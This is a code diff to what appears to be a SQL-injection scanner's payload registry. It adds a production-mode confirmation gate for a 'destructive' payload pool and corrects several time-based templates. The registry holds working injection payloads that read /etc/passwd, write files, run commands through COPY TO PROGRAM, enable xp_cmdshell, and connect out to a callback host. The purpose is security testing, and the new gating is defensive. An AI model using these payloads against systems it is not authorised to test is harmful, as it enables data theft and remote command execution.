@@ -17,7 +17,80 @@
 //   条目可声明 minVersion/maxVersion（数字或 {major,minor}）标注适用版本区间，
 //   selectPayloads 按 ctx.dbmsVersion（指纹阶段解析）过滤；版本未知 → 不过滤（保守投放）。
 
+import { AsyncLocalStorage } from 'node:async_hooks';
 import { versionAtLeast, versionBelow } from './dbmsVersion.js';
+import { DESTRUCTIVE_PAYLOADS } from './payloads/destructive.js';
+
+// ============================================================================
+// [P0-FIX 2026-09-09] 高危（destructive）池投放策略 —— productionMode 硬门
+// ----------------------------------------------------------------------------
+// 为什么要这一层：注册表里 id 带 `-dest-` 的条目（以及模板与 payloads/destructive.js 同源的条目）
+// 就是 INTO OUTFILE 写文件 / LOAD_FILE·pg_read_file 任意文件读 / xp_cmdshell·COPY TO PROGRAM·
+// load_extension 命令执行 / sp_configure 永久改服务器配置 / GET_LOCK·BENCHMARK·RANDOMBLOB DoS /
+// OPENROWSET·UTL_HTTP 外连。此前**只看 risk**：用户把 risk 拖到 3（前端一个滑条），下一轮扫描就把
+// 这些模板打进客户生产库 ——「开关有名无实」的反面：开关有实无门。而扇平路径又完全不投放（同一个
+// risk=3 两种后果），两者都不可接受。现统一为：生产环境下投放高危池必须 confirmDestructive===true。
+//
+// 策略传递通道：Detection 侧调用方（ErrorDetector / TimeBlindDetector）只传 dbms/technique/level/risk/
+// testFilter/testSkip 六个字段给 selectPayloads，而这两个检测器属于禁改文件 → 无法从签名上接新参数。
+// 故用 AsyncLocalStorage 做「一次扫描一个策略」的上下文注入（ScanManager._run 建立），
+// 而不是进程级可变全局：并发扫描各拿各的 policy，不会 A 扫描的 confirm 泄漏给 B 扫描。
+//
+// 兼容性红线：**无显式参数且无扫描上下文时不施加门禁**（保持旧筛选语义）——否则直调
+// selectPayloads 的现有单测（tests/unit/registryFilter.test.js：risk=3 应返回全量）会被误伤。
+// 真实扫描路径总是经过 ScanManager._run，因此总是带策略 → 默认 fail-closed。
+// ============================================================================
+
+// destructive.js 里的模板集（注册表的 -dest- 条目即由它同源生成，用内容而不是只靠 id 字串判定）
+const DESTRUCTIVE_TEMPLATES = new Set(
+  Object.values(DESTRUCTIVE_PAYLOADS).flatMap((byTech) => Object.values(byTech).flat())
+);
+const DESTRUCTIVE_ID_RE = /(?:^|-)dest-/;
+
+// 判定一条注册表条目是否属于高危池（id 带 -dest- 或模板与 destructive 池同串）。
+// falseTemplate 一并查：高危池目前无假对，但防后续补条目时绕过判定。
+export function isDestructivePayload(entry) {
+  if (!entry || typeof entry !== 'object') return false;
+  if (DESTRUCTIVE_ID_RE.test(String(entry.id || ''))) return true;
+  for (const tpl of [entry.template, entry.falseTemplate]) {
+    if (typeof tpl === 'string' && DESTRUCTIVE_TEMPLATES.has(tpl)) return true;
+  }
+  return false;
+}
+
+const destructivePolicyStore = new AsyncLocalStorage();
+
+/**
+ * 在指定高危池策略下执行 fn（ScanManager._run 包裹整个扫描流水线的入口）。
+ * @param {{productionMode?:boolean, confirmDestructive?:boolean}} policy
+ * @param {() => any} fn
+ */
+export function runWithDestructivePolicy(policy, fn) {
+  return destructivePolicyStore.run({ ...(policy || {}) }, fn);
+}
+
+/** 读取当前上下文的高危池策略（非扫描上下文返回 null） */
+export function currentDestructivePolicy() {
+  return destructivePolicyStore.getStore() || null;
+}
+
+/**
+ * 解析本次筛选的高危池放行结论。返回 null = 不施加门禁（无策略上下文且调用方未显式传参）。
+ * @param {{productionMode?:boolean, confirmDestructive?:boolean}} args selectPayloads 入参
+ */
+function resolveDestructiveGate(args = {}) {
+  const explicit = args.productionMode !== undefined || args.confirmDestructive !== undefined;
+  const policy = destructivePolicyStore.getStore();
+  if (!explicit && !policy) return null;
+  const productionMode =
+    args.productionMode !== undefined ? args.productionMode !== false : policy?.productionMode !== false;
+  const confirmDestructive =
+    args.confirmDestructive !== undefined
+      ? args.confirmDestructive === true
+      : policy?.confirmDestructive === true;
+  // 生产模式：必须显式确认；脱离生产护栏（productionMode=false）：保持旧语义（risk>=3 即投放）
+  return { allowed: !productionMode || confirmDestructive, productionMode, confirmDestructive };
+}
 
 /** @type {Array<{id:string, dbms:string[], technique:string, level:number, risk:number,
  *  clause:string[], boundary:string[], template:string, falseTemplate?:string, where:string,
@@ -42,7 +115,7 @@ export const PAYLOAD_REGISTRY = [
   { id: 'mysql-time-benchmark-1', dbms: ['MySQL', 'MariaDB', 'TiDB'], technique: 'time', level: 3, risk: 2, clause: ['where'], boundary: ["'"], template: "{ORIG}' AND BENCHMARK({SLEEP}0000000,MD5('a'))-- -", where: 'value' },
   { id: 'mysql-union-1', dbms: ['MySQL', 'MariaDB', 'TiDB'], technique: 'union', level: 1, risk: 1, clause: ['where'], boundary: [''], template: '{ORIG} UNION SELECT {NUM},database(),version()-- -', where: 'value' },
   { id: 'mysql-union-2', dbms: ['MySQL', 'MariaDB', 'TiDB'], technique: 'union', level: 2, risk: 1, clause: ['where'], boundary: ["')"], template: "{ORIG}') UNION SELECT {NUM},database(),version()-- -", where: 'value' },
-  { id: 'mysql-stacked-1', dbms: ['MySQL', 'MariaDB', 'TiDB'], technique: 'stacked', level: 3, risk: 2, clause: ['where'], boundary: [';'], template: '{ORIG}; SLEEP({SLEEP}) {SEP}', where: 'value' },
+  { id: 'mysql-stacked-1', dbms: ['MySQL', 'MariaDB', 'TiDB'], technique: 'stacked', level: 3, risk: 2, clause: ['where'], boundary: [';'], template: '{ORIG}; SELECT SLEEP({SLEEP}) {SEP}', where: 'value' },
 
   // ==================== PostgreSQL ====================
   { id: 'pg-bool-sq-1', dbms: ['PostgreSQL'], technique: 'boolean', level: 1, risk: 1, clause: ['where'], boundary: ["'"], template: "{ORIG}' AND '1'='1", falseTemplate: "{ORIG}' AND '1'='2", where: 'value' },
@@ -271,15 +344,15 @@ export const PAYLOAD_REGISTRY = [
   { id: 'mysql-time-125', dbms: ["MySQL","MariaDB","TiDB"], technique: 'time', level: 3, risk: 2, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND BENCHMARK({SLEEP}0000000,MD5(1))/**/", where: 'value' },
   { id: 'mysql-time-126', dbms: ["MySQL","MariaDB","TiDB"], technique: 'time', level: 3, risk: 2, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND IF(1=1,SLEEP({SLEEP}),0)#", where: 'value' },
   { id: 'mysql-time-127', dbms: ["MySQL","MariaDB","TiDB"], technique: 'time', level: 3, risk: 2, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND IF(1=1,SLEEP({SLEEP}),0)/**/", where: 'value' },
-  { id: 'mysql-stacked-100', dbms: ["MySQL","MariaDB","TiDB"], technique: 'stacked', level: 3, risk: 2, clause: ["where"], boundary: ["';"], template: "{ORIG}'; SLEEP({SLEEP}) {SEP}", where: 'value' },
-  { id: 'mysql-stacked-101', dbms: ["MySQL","MariaDB","TiDB"], technique: 'stacked', level: 3, risk: 2, clause: ["where"], boundary: ["\";"], template: "{ORIG}\"; SLEEP({SLEEP}) {SEP}", where: 'value' },
+  { id: 'mysql-stacked-100', dbms: ["MySQL","MariaDB","TiDB"], technique: 'stacked', level: 3, risk: 2, clause: ["where"], boundary: ["';"], template: "{ORIG}'; SELECT SLEEP({SLEEP}) {SEP}", where: 'value' },
+  { id: 'mysql-stacked-101', dbms: ["MySQL","MariaDB","TiDB"], technique: 'stacked', level: 3, risk: 2, clause: ["where"], boundary: ["\";"], template: "{ORIG}\"; SELECT SLEEP({SLEEP}) {SEP}", where: 'value' },
   { id: 'mysql-stacked-102', dbms: ["MySQL","MariaDB","TiDB"], technique: 'stacked', level: 3, risk: 2, clause: ["where"], boundary: [");"], template: "{ORIG}); SELECT SLEEP({SLEEP}) {SEP}", where: 'value' },
   { id: 'mysql-stacked-103', dbms: ["MySQL","MariaDB","TiDB"], technique: 'stacked', level: 3, risk: 2, clause: ["where"], boundary: ["')"], template: "{ORIG}') ; SELECT SLEEP({SLEEP}) {SEP}", where: 'value' },
   { id: 'mysql-stacked-104', dbms: ["MySQL","MariaDB","TiDB"], technique: 'stacked', level: 3, risk: 2, clause: ["where"], boundary: ["';"], template: "{ORIG}';SELECT SLEEP({SLEEP}) {SEP}", where: 'value' },
-  { id: 'mysql-stacked-105', dbms: ["MySQL","MariaDB","TiDB"], technique: 'stacked', level: 3, risk: 2, clause: ["where"], boundary: ["';"], template: "{ORIG}'; SLEEP({SLEEP})#", where: 'value' },
-  { id: 'mysql-stacked-106', dbms: ["MySQL","MariaDB","TiDB"], technique: 'stacked', level: 3, risk: 2, clause: ["where"], boundary: ["';"], template: "{ORIG}'; SLEEP({SLEEP})/**/", where: 'value' },
+  { id: 'mysql-stacked-105', dbms: ["MySQL","MariaDB","TiDB"], technique: 'stacked', level: 3, risk: 2, clause: ["where"], boundary: ["';"], template: "{ORIG}'; SELECT SLEEP({SLEEP})#", where: 'value' },
+  { id: 'mysql-stacked-106', dbms: ["MySQL","MariaDB","TiDB"], technique: 'stacked', level: 3, risk: 2, clause: ["where"], boundary: ["';"], template: "{ORIG}'; SELECT SLEEP({SLEEP})/**/", where: 'value' },
   { id: 'mysql-stacked-107', dbms: ["MySQL","MariaDB","TiDB"], technique: 'stacked', level: 3, risk: 2, clause: ["where"], boundary: ["';"], template: "{ORIG}'; SELECT IF(1=1,SLEEP({SLEEP}),0) {SEP}", where: 'value' },
-  { id: 'mysql-stacked-108', dbms: ["MySQL","MariaDB","TiDB"], technique: 'stacked', level: 3, risk: 2, clause: ["where"], boundary: [");"], template: "{ORIG}); SLEEP({SLEEP}) {SEP}", where: 'value' },
+  { id: 'mysql-stacked-108', dbms: ["MySQL","MariaDB","TiDB"], technique: 'stacked', level: 3, risk: 2, clause: ["where"], boundary: [");"], template: "{ORIG}); SELECT SLEEP({SLEEP}) {SEP}", where: 'value' },
   { id: 'mysql-stacked-109', dbms: ["MySQL","MariaDB","TiDB"], technique: 'stacked', level: 3, risk: 2, clause: ["where"], boundary: ["';"], template: "{ORIG}'; SET @sqli_probe=1; SELECT SLEEP({SLEEP}) {SEP}", where: 'value' },
   { id: 'mysql-stacked-110', dbms: ["MySQL","MariaDB","TiDB"], technique: 'stacked', level: 4, risk: 2, clause: ["where"], boundary: ["';"], template: "{ORIG}'; SELECT * FROM information_schema.GLOBAL_VARIABLES WHERE VARIABLE_NAME='version'-- -", where: 'value' },
   { id: 'mysql-error-orderby-159', dbms: ["MySQL","MariaDB","TiDB"], technique: 'error', level: 1, risk: 1, clause: ["orderby"], boundary: [""], template: "{ORIG},(extractvalue(1,concat(0x7e,(SELECT version()))))-- -", where: 'position' },
@@ -705,8 +778,11 @@ export const PAYLOAD_REGISTRY = [
   { id: 'mysql-stacked-dest-1', dbms: ["MySQL","MariaDB","TiDB"], technique: 'stacked', level: 5, risk: 3, clause: ["where"], boundary: ["';"], template: "{ORIG}'; SELECT 'test' INTO OUTFILE '/tmp/sqli_test.txt'-- -", where: 'value' },
   { id: 'mysql-stacked-dest-2', dbms: ["MySQL","MariaDB","TiDB"], technique: 'stacked', level: 5, risk: 3, clause: ["where"], boundary: ["';"], template: "{ORIG}'; SELECT LOAD_FILE('/etc/passwd')-- -", where: 'value' },
   { id: 'pg-time-dest-1', dbms: ["PostgreSQL"], technique: 'time', level: 5, risk: 3, clause: ["where"], boundary: ["';"], template: "{ORIG}'; COPY (SELECT 1) TO PROGRAM 'sleep 5'-- -", where: 'value' },
-  { id: 'pg-time-dest-2', dbms: ["PostgreSQL"], technique: 'time', level: 5, risk: 3, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND pg_read_file('/etc/passwd') IS NOT NULL-- -", where: 'value' },
-  { id: 'pg-time-dest-3', dbms: ["PostgreSQL"], technique: 'time', level: 5, risk: 3, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND lo_import('/etc/passwd') > 0-- -", where: 'value' },
+  // [P1 2026-09-09] pg-time-dest-2/3 原为 pg_read_file/lo_import（文件读/OOB 误标成 time：
+  // 小文件读取无延迟，时间检测恒不命中的「静默缺失」；lo_import 还会在目标库写对象）。
+  // 改为 PG 核心函数 pg_sleep（pg_catalog 原生，无需扩展）——真延迟 + 无副作用。
+  { id: 'pg-time-dest-2', dbms: ["PostgreSQL"], technique: 'time', level: 5, risk: 3, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND pg_sleep(5) IS NULL-- -", where: 'value' },
+  { id: 'pg-time-dest-3', dbms: ["PostgreSQL"], technique: 'time', level: 5, risk: 3, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=pg_sleep(5)-- -", where: 'value' },
   { id: 'pg-stacked-dest-1', dbms: ["PostgreSQL"], technique: 'stacked', level: 5, risk: 3, clause: ["where"], boundary: ["';"], template: "{ORIG}'; SELECT dblink_connect('host={CALLBACK} user=sqli')-- -", where: 'value' },
   { id: 'pg-stacked-dest-2', dbms: ["PostgreSQL"], technique: 'stacked', level: 5, risk: 3, clause: ["where"], boundary: ["';"], template: "{ORIG}'; SELECT pg_ls_dir('/')-- -", where: 'value' },
   { id: 'lite-time-dest-1', dbms: ["SQLite"], technique: 'time', level: 5, risk: 3, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND LIKE('ABCDEFG', HEX(RANDOMBLOB(10000000)))-- -", where: 'value' },
@@ -722,7 +798,7 @@ export const PAYLOAD_REGISTRY = [
   { id: 'mssql-stacked-dest-2', dbms: ["SQL Server"], technique: 'stacked', level: 5, risk: 3, clause: ["where"], boundary: ["';"], template: "{ORIG}'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion', 'ProductName'-- -", where: 'value' },
   { id: 'mssql-stacked-dest-3', dbms: ["SQL Server"], technique: 'stacked', level: 5, risk: 3, clause: ["where"], boundary: ["';"], template: "{ORIG}'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE-- -", where: 'value' },
   { id: 'ora-error-dest-1', dbms: ["Oracle"], technique: 'error', level: 5, risk: 3, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT banner FROM v$version WHERE rownum=1))-- -", where: 'value' },
-  { id: 'ora-time-dest-1', dbms: ["Oracle"], technique: 'time', level: 5, risk: 3, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND UTL_HTTP.REQUEST('http://{CALLBACK}/oracle_oob')=1-- -", where: 'value' },
+  { id: 'ora-time-dest-1', dbms: ["Oracle"], technique: 'time', level: 5, risk: 3, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND (SELECT DBMS_PIPE.RECEIVE_MESSAGE('sqli',5) FROM DUAL)=0-- -", where: 'value' },
 ];
 
 // id 唯一性自检（声明期校验，防止手写重复 id 静默吞掉条目）
@@ -748,10 +824,13 @@ export const PAYLOAD_REGISTRY = [
  *
  * @param {{dbms?: string, technique?: string, level?: number, risk?: number,
  *          clause?: string[], boundary?: string,
- *          testFilter?: string, testSkip?: string}} opts
+ *          testFilter?: string, testSkip?: string,
+ *          productionMode?: boolean, confirmDestructive?: boolean}} opts
  * @returns {typeof PAYLOAD_REGISTRY} 筛选后的条目（原对象引用，不拷贝）
  */
-export function selectPayloads({ dbms, technique, level, risk, clause, boundary, testFilter, testSkip, dbmsVersion } = {}) {
+export function selectPayloads({ dbms, technique, level, risk, clause, boundary, testFilter, testSkip, dbmsVersion, productionMode, confirmDestructive } = {}) {
+  // [P0-FIX 2026-09-09] 高危池硬门（显式参数 > 扫描上下文策略 > 不施加）
+  const gate = resolveDestructiveGate({ productionMode, confirmDestructive });
   // 解析 testFilter：逗号分隔 → 小写子串数组（空值过滤）
   const filterIds = testFilter
     ? String(testFilter).split(',').map((s) => s.trim().toLowerCase()).filter(Boolean)
@@ -780,8 +859,40 @@ export function selectPayloads({ dbms, technique, level, risk, clause, boundary,
     if (filterIds.length > 0 && !filterIds.some((f) => p.id.toLowerCase().includes(f))) return false;
     // testSkip：黑名单 — id 包含任一 skip 子串则排除
     if (skipIds.some((s) => p.id.toLowerCase().includes(s))) return false;
+    // [P0-FIX 2026-09-09] productionMode 硬门：未确认则高危池模板不投放（不抛错、不中断扫描）。
+    // 实战后果：一次误配置就把 RCE/写文件 payload 送进生产库，或反过来让使用者以为 risk 生效了
+    // 而实际没测——两种都是事故。抑制本身必须进报告，见 ScanManager._noteConstraint。
+    if (gate && !gate.allowed && isDestructivePayload(p)) return false;
     return true;
   });
+}
+
+/**
+ * [P0-FIX 2026-09-09] 统计「若不考虑高危池硬门，本配置会投到多少条高危模板」。
+ * 供 ScanManager 判断是否需要往 report.summary.constraints 记一条抑制说明——
+ * 避免「risk=3 但 level=1 本来就投不到」时记一条假约束（误导读的人去改无关开关）。
+ * 与 selectPayloads 共用 level/risk/testFilter/testSkip 语义（不看 dbms/clause/boundary：
+ * 取保守上界，宁可多记一条也不能漏记）。
+ * @param {{level?:number, risk?:number, testFilter?:string, testSkip?:string}} [opts]
+ * @returns {number}
+ */
+export function countDestructiveCandidates({ level, risk, testFilter, testSkip } = {}) {
+  const filterIds = testFilter
+    ? String(testFilter).split(',').map((s) => s.trim().toLowerCase()).filter(Boolean)
+    : [];
+  const skipIds = testSkip
+    ? String(testSkip).split(',').map((s) => s.trim().toLowerCase()).filter(Boolean)
+    : [];
+  let n = 0;
+  for (const p of PAYLOAD_REGISTRY) {
+    if (!isDestructivePayload(p)) continue;
+    if (level && p.level > level) continue;
+    if (risk && p.risk > risk) continue;
+    if (filterIds.length > 0 && !filterIds.some((f) => p.id.toLowerCase().includes(f))) continue;
+    if (skipIds.some((s) => p.id.toLowerCase().includes(s))) continue;
+    n += 1;
+  }
+  return n;
 }
 
 /**
